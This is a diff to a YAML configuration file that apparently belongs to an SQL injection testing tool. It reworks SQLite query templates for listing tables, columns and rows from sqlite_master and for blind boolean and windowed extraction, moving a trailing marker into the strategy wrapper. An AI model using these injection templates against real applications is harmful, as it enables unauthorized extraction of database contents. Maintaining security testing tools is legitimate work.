@@ -8,7 +8,6 @@ resource:
       || 'sqlite_master'
       || '${enclose_value_sql}'
       || 'anonymous'
-      || '${trail_sql}'
 
  schema:
   database: |
@@ -17,7 +16,7 @@ resource:
        || r
        || '${separator_qte_sql}'
        || q
-       || '${enclose_value_sql}${trail_sql}'
+       || '${enclose_value_sql}'
    from (
        select
            'sqlite_master' r,
@@ -35,7 +34,6 @@ resource:
            || '${separator_qte_sql}0${enclose_value_sql}',
            '${separator_cell_sql}'
        )
-       || '${trail_sql}'
    from (
        select *
        from sqlite_master
@@ -45,10 +43,7 @@ resource:
    )
 
   column: |
-   select
-       sql
-       || '${trail_sql}'
-   from sqlite_master
+   select sql from sqlite_master
    where tbl_name = '${table}'
    and type = 'table'
    ${limit}
@@ -65,7 +60,6 @@ resource:
             ),
             ''
         )
-        || '${trail_sql}'
     from (
         select distinct ${fields} r
         from ${table}
@@ -86,7 +80,7 @@ resource:
    select
        '${enclose_value_sql}sqlite_master${separator_qte_sql}'
        || count(*)
-       || '${enclose_value_sql}${trail_sql}'
+       || '${enclose_value_sql}'
    from sqlite_master
    where type = 'table'
    ${limit}
@@ -95,15 +89,13 @@ resource:
    select
        '${enclose_value_sql}'
        || name
-       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+       || '${separator_qte_sql}0${enclose_value_sql}'
    from sqlite_master
    where type = 'table'
    ${limit}
 
   column: |
-   select
-       sql
-       || '${trail_sql}'
+   select sql
    from sqlite_master
    where tbl_name = '${table}'
    and type = 'table'
@@ -114,7 +106,7 @@ resource:
     select
         '${enclose_value_sql}'
         || ${fields}
-        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+        || '${separator_qte_sql}0${enclose_value_sql}'
     from ${table}
     ${limit}
    fields:
@@ -129,10 +121,14 @@ strategy:
        select
            '${lead}'
            || substr(
-               (${injection}),
+               ifnull(
+                   (${injection}),
+                   ''
+               ),
                ${window.char},
                65536
            )
+           || '${trail_sql}'
    )
   limit: limit 65536 offset ${limit.value}
   failsafe: 1337${indice}7330%2b1
@@ -195,7 +191,6 @@ strategy:
         )
     )
     %26 ${bit}
-   length: length(${injection}) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
